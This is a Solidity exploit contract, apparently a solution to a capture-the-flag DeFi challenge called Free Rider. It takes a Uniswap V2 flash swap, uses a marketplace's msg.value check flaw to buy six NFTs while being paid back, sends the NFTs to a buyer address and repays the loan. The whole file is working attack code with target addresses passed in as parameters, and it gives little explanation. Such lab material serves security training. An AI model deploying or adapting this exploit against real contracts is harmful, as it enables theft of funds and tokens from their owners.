// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

import "hardhat/console.sol";

interface IWETH {
    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function totalSupply() external view returns (uint256);

    function approve(address guy, uint256 wad) external returns (bool);

    function transfer(address dst, uint256 wad) external returns (bool);

    function balanceOf(address from) external view returns (uint256);
}

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract ExploitFreeRider is
    IERC721Receiver,
    IUniswapV2Callee,
    Ownable,
    ReentrancyGuard
{
    using Address for address;

    IERC721 private immutable nft;
    IMarketplace private marketplace;
    IUniswapV2Factory private uniFactory;
    IUniswapV2Pair private uniPair;
    IWETH private weth;

    address private immutable buyer;

    constructor(
        address _buyer,
        address _marketplace,
        address _nft,
        address _uniFactory,
        address _uniPair,
        address _weth
    ) payable {
        marketplace = IMarketplace(_marketplace);
        uniFactory = IUniswapV2Factory(_uniFactory);
        uniPair = IUniswapV2Pair(_uniPair);
        nft = IERC721(_nft);
        buyer = _buyer;

        weth = IWETH(_weth);
        weth.deposit{value: msg.value}();
    }

    function execute() external onlyOwner {
        // flashloan 15 eth
        uniPair.swap(15 ether, 0, address(this), abi.encode("something")); //need to pass some data so flashswap is used
        // buy all nft with 15 (all costs 90 but marketplace only checks msg.value for one)
        // returns paid ETH to sender because of _buyOne() coding mistake
        // send to buyerContract
        // done
    }

    // called by flashswap
    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256 amount1,
        bytes calldata
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        assert(msg.sender == uniFactory.getPair(token0, token1));
        require(token0 == address(weth) || token1 == address(weth));

        uint256 wethAmount = token0 == address(weth) ? amount0 : amount1;
        uint256 fee = (wethAmount * 3) / 1000;
        uint256 repayAmount = wethAmount + fee + 1000000 gwei; //add some tolerance, avoids 'UniswapV2: K'

        buyNFT(wethAmount);
        transferAllNFT();

        weth.transfer(msg.sender, repayAmount); // return flashswap
    }

    function buyNFT(uint256 amount) private {
        uint256[] memory tokenIds = new uint256[](6);

        for (uint8 i = 0; i < tokenIds.length; i++) {
            tokenIds[i] = i;
        }

        weth.withdraw(amount); // Get ETH to pay for NFTs
        marketplace.buyMany{value: amount}(tokenIds);
        weth.deposit{value: amount}();
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external view override returns (bytes4) {
        require(msg.sender == address(nft));

        return IERC721Receiver.onERC721Received.selector;
    }

    function transferAllNFT() private {
        for (uint8 i = 0; i <= 5; i++) {
            nft.safeTransferFrom(address(this), buyer, i);
        }
    }

    receive() external payable {}
}
